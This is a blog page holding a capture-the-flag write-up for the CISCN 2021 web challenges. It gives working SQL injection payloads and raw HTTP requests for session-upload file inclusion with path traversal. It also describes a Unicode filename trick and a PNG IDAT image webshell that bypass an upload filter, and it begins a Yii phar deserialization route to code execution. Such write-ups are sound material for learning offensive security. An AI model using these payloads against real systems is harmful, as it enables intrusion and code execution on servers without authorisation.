@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="easy_sql报错注入，盲猜flag表，但不知道名称，用重复column名爆列名 参考：无列名注入小记 1uname&#x3D;%27)&#x2F;**&#x2F;||&#x2F;**&#x2F;(select&#x2F;**&#x2F;1&#x2F;**&#x2F;from&#x2F;**&#x2F;flag&#x2F;**&#x2F;where(select&#x2F;**&#x2F;*&#x2F;**&#x2F;from(select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag&#x2F;**&#x2F;as a&#x2F;**&#x2F;join&#x2F;**&#x2F;flag&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;us">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2021初赛 Web Writeup">
+<meta property="og:url" content="https://jlkl.github.io/2021/05/20/Web_18/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="easy_sql报错注入，盲猜flag表，但不知道名称，用重复column名爆列名 参考：无列名注入小记 1uname&#x3D;%27)&#x2F;**&#x2F;||&#x2F;**&#x2F;(select&#x2F;**&#x2F;1&#x2F;**&#x2F;from&#x2F;**&#x2F;flag&#x2F;**&#x2F;where(select&#x2F;**&#x2F;*&#x2F;**&#x2F;from(select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag&#x2F;**&#x2F;as a&#x2F;**&#x2F;join&#x2F;**&#x2F;flag&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;us">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518133714.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518134151.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190255.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190443.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190615.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520094553.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520095354.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520143637.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520143951.png">
+<meta property="article:published_time" content="2021-05-20T06:54:55.000Z">
+<meta property="article:modified_time" content="2021-05-20T06:59:25.370Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518133714.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2021/05/20/Web_18/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>CISCN2021初赛 Web Writeup | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">15</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">35</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2021/05/20/Web_18/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN2021初赛 Web Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-05-20 14:54:55 / Modified: 14:59:25" itemprop="dateCreated datePublished" datetime="2021-05-20T14:54:55+08:00">2021-05-20</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/05/20/Web_18/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/05/20/Web_18/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>12k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>15 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>报错注入，盲猜flag表，但不知道名称，用重复column名爆列名</p>
+<p>参考：<a href="https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">无列名注入小记</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%27)<span class="comment">/**/</span>||<span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">where</span>(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">as</span> a<span class="comment">/**/</span><span class="keyword">join</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">using</span>(<span class="keyword">id</span>,<span class="keyword">no</span>))<span class="keyword">as</span><span class="comment">/**/</span>c))<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span>(<span class="string">'1&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518133714.png" alt="image-20210518133713042"></p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=%<span class="number">27</span>)<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select<span class="comment">/**/</span>substr(`e691d77e-<span class="number">5</span>da1-<span class="number">409</span>b-a37b-ff4edfa14123`,<span class="number">31</span>)<span class="comment">/**/</span>from<span class="comment">/**/</span>flag),<span class="number">0</span>x7e))<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>('<span class="number">0</span>&amp;passwd=<span class="number">1</span>&amp;Submit=<span class="variable">%E7%</span><span class="number">99</span><span class="variable">%BB%</span>E5<span class="variable">%BD%</span><span class="number">95</span></span><br><span class="line"></span><br><span class="line">uname=%<span class="number">27</span>)<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select<span class="comment">/**/</span>substr(`e691d77e-<span class="number">5</span>da1-<span class="number">409</span>b-a37b-ff4edfa14123`)<span class="comment">/**/</span>from<span class="comment">/**/</span>flag),<span class="number">0</span>x7e))<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>('<span class="number">0</span>&amp;passwd=<span class="number">1</span>&amp;Submit=<span class="variable">%E7%</span><span class="number">99</span><span class="variable">%BB%</span>E5<span class="variable">%BD%</span><span class="number">95</span></span><br></pre></td></tr></table></figure>
+
+<p>读出flag CISCN{9fO5F-WC2YL-GY3zM-R4aIu-kAjxU-}</p>
+<a id="more"></a>
+
+<h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>原题：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/" target="_blank" rel="noopener">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>
+<h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>扫出来一个phpinfo 页面</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518134151.png" alt="image-20210518134150949"></p>
+<p>根据phpinfo ，猜测可能是 session 包含，因此启动两个线程，一个包含 php 内容，一个访问包含，就 var_dump /etc 了好几次有点难受</p>
+<p>session_upload_process</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 124.71.229.172:21940</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.25.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=star1</span><br><span class="line"><span class="attribute">Content-Length</span>: 1343</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=a052c080752fddf220113461b22d48a7</span><br><span class="line"></span><br><span class="line">--a052c080752fddf220113461b22d48a7</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">$root='/etc/fhfeeeaagb/badidicfgc/eabdhbdgeb/babgfddbff';</span><br><span class="line">$filenames=scandir($root);</span><br><span class="line"><span class="attribute">while(is_dir($filenames[2]))&#123;</span></span><br><span class="line">	$root=$root.'/'.$filenames[2];</span><br><span class="line">	$filenames=scandir($root);</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">var_dump($root.'/'.$filenames[2]);</span></span><br><span class="line"><span class="attribute">var_dump(file_get_contents($root.'/'.$filenames[2]));</span></span><br><span class="line"><span class="attribute">?&gt;</span></span><br><span class="line"><span class="attribute">--a052c080752fddf220113461b22d48a7</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="1.txt"</span><br><span class="line"><span class="attribute">a*100000</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 124.71.229.172:21940</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.25.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=star1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 124</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">cf=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fphp%2Fsessions%2Fcafdcffacd%2Fsess_star1</span><br></pre></td></tr></table></figure>
+
+<p>两个包放在repeater 里面 30 线程跑，不断看结果，改目录。<br>最后目录在<code>/etc/fhfeeeaagb/badidicfgc/eabdhbdgeb/babgfddbff/fbhbiaihha/fl444444g</code>直接包含<br>CISCN{lxs4A5ku06-ywSkx-iasCN-9AMPN-}</p>
+<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"ctf"</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"ctf"</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">"ctf"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">"upload"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">'postedFile'</span>][<span class="string">'size'</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"这么大个的东西你是想d我吗？"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imageinfo = getimagesize($_FILES[<span class="string">'postedFile'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo === <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"如果不能好好传图片的话就还是不要来打扰我了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; $imageinfo[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"东西不能方方正正的话就很讨厌"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $fileName=urldecode($_FILES[<span class="string">'postedFile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr($fileName,<span class="string">"c"</span>) || stristr($fileName,<span class="string">"i"</span>) || stristr($fileName,<span class="string">"h"</span>) || stristr($fileName,<span class="string">"ph"</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"有些东西让你传上去的话那可不得了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imagePath = <span class="string">"image/"</span> . mb_strtolower($fileName);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">"postedFile"</span>][<span class="string">"tmp_name"</span>], $imagePath)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"upload success, image at $imagePath"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"传都没有传上去"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>getimagesize判断是否图片，要求图片宽和高为1，同时要求后缀不能有<code>c</code>、<code>i</code>、<code>h</code>、<code>ph</code>，那么上传php和<code>.htaccess</code>就不行了</p>
+<p>example.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"ctf"</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"ctf"</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">"ctf"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">"poc"</span>) &#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    $name_for_zip = <span class="string">"example/"</span> . $_POST[<span class="string">"file"</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">"."</span>,$name_for_zip)[count(explode(<span class="string">"."</span>,$name_for_zip))<span class="number">-1</span>]!==<span class="string">"zip"</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"要不咱们再看看？"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"都不能解压呢"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"可以解压，我想想存哪里"</span>;</span><br><span class="line">    $pos_for_zip = <span class="string">"/tmp/example/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    $zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(<span class="string">"$pos_for_zip/*"</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir($file)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = imagecreatefrompng($file);</span><br><span class="line">        $size = min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [<span class="string">'x'</span> =&gt; <span class="number">0</span>, <span class="string">'y'</span> =&gt; <span class="number">0</span>, <span class="string">'width'</span> =&gt; $size, <span class="string">'height'</span> =&gt; $size]);</span><br><span class="line">        <span class="keyword">if</span> ($second !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[<span class="string">"basename"</span>];</span><br><span class="line">            imagepng($second, <span class="string">'example/'</span>.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从压缩包解压，并对图片重新裁剪</p>
+<p>这里有一个trick，mb_strtolower处理某些unicode字符时会有问题</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">var_dump</span>(<span class="title">mb_strtolower</span>(<span class="string">'İ'</span>)===<span class="string">'i'</span>);</span></span><br><span class="line"><span class="function"><span class="comment">//true</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里stristr判断黑名单后又用mb_strtolower处理，且有二次urldecode，那么思路就很明显了，上传zip压缩包文件，然后解压getshell</p>
+<p>常规图片马都是在末尾添加php代码，但是这里解压过后会对图片进行裁剪，导致php代码丢失，所以这里采用写入到图片数据里，即IDAT块</p>
+<p>用这个工具生成图片马</p>
+<p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/" target="_blank" rel="noopener">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a></p>
+<p>更改后缀为php，然后打包进zip压缩包</p>
+<p>这里又有一个trick，可以用下面内容绕过getimagesize</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1</span></span><br></pre></td></tr></table></figure>
+
+<p>百度了一下大概是xmb图片定义宽高的方法，可以在文件任何位置，但是必须在一行的开头（即前面必须有%0d%0a）</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190255.png" alt="image-20210519190247440"></p>
+<p>成功上传</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190443.png" alt="image-20210519190443012"></p>
+<p>解压</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190615.png" alt="image-20210519190614470"></p>
+<p>访问getshell</p>
+<p>同时这里记录一个坑点，我之前调试的时候使用的是2020.1版本的burpsuite，但是上传文件之后总发现文件内容被更改了，后来才发现paste from file的时候burp把一些十六进制字符比如8D直接就转换成了3F，emmm……后来换成最新版burp就没问题了，还是应该及时更新</p>
+<h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>首先搭建一个yii环境</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="built_in">--prefer-dist</span> <span class="string">yiisoft/</span><span class="string">yii2-app-</span><span class="string">basic </span><span class="string">my-yii</span></span><br></pre></td></tr></table></figure>
+
+<p>加上提示配置</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'log'</span> =&gt; [</span><br><span class="line">    <span class="string">'traceLevel'</span> =&gt; YII_DEBUG ? <span class="number">0</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="string">'targets'</span> =&gt; [</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'class'</span> =&gt; <span class="string">'yii\log\FileTarget'</span>,</span><br><span class="line">            <span class="string">'levels'</span> =&gt; [<span class="string">'error'</span>],</span><br><span class="line">            <span class="string">'logVars'</span> =&gt; [],</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure>
+
+<p>发现 <code>/runtime/logs/app.log</code>日志文件，和Laravel的差不多</p>
+<p>题目附件里改动就这一个路由，读取文件再写入，那么整体思路应该和Laravel Debug RCE差不多，清空log文件，写入phar，然后再phar反序列化</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520094553.png" alt="image-20210520094545426"></p>
